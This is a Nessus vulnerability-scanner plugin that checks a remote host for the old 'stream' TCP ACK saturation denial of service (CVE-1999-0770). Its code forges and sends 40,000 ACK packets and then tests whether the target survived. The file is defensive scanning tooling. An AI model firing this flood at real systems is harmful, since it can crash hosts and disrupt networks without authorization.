#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added links to the Bugtraq message archive
#

include("compat.inc");

if (description)
{
 script_id(10271);
 script_version("$Revision: 1.31 $");
 script_cvs_date("$Date: 2016/11/03 20:40:06 $");

 script_cve_id("CVE-1999-0770");
 script_bugtraq_id(549);
 script_osvdb_id(1027);

 script_name(english:"TCP/IP ACK Packet Saturation Remote DoS (stream.c)");
 script_summary(english:"Crashes the remote host using the 'stream' attack");

 script_set_attribute(attribute:"synopsis", value:"The remote host is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It seems it was possible to make the remote server crash using the
'stream' (or 'raped') attack.

An attacker may use this flaw to shut down this server, thus
preventing your network from working properly.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Jul/247");
 script_set_attribute(attribute:"solution", value:
"Solution :

Contact your operating system vendor for a patch.

- If you use IP filter, then add these rules :

  block in quick proto tcp from any to any head 100
  pass in quick proto tcp from any to any flags S keep state group 100
  pass in all");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/07/29");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/01/21");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_FLOOD);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);


if ( TARGET_IS_IPV6 ) exit(0);
addr = this_host();
id = rand();
sport = rand();
seq = rand();

port = get_host_open_port();
if(!port)port = rand() % 65535;


start_denial();
for(i=0;i<40000;i=i+1)
{
 id = id + 1;
 sport = sport + 1;
 seq  = seq+1;
 ip = forge_ip_packet(   ip_v : 4,
			ip_hl : 5,
			ip_tos : 0x08,
			ip_len : 20,
		        ip_id : id,
			ip_p : IPPROTO_TCP,
			ip_ttl : 255,
		        ip_off : 0,
			ip_src : addr);

 tcpip = forge_tcp_packet(    ip      : ip,
			     th_sport : sport,
			     th_dport : port,
			     th_flags : TH_ACK,
		             th_seq   : seq,
			     th_ack   : 0,
			     th_x2    : 0,
		 	     th_off   : 5,
			     th_win   : 2048,
			     th_urp   : 0);


 send_packet(tcpip, pcap_active:FALSE);
}
sleep(5);
alive = end_denial();

if(!alive)     {
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
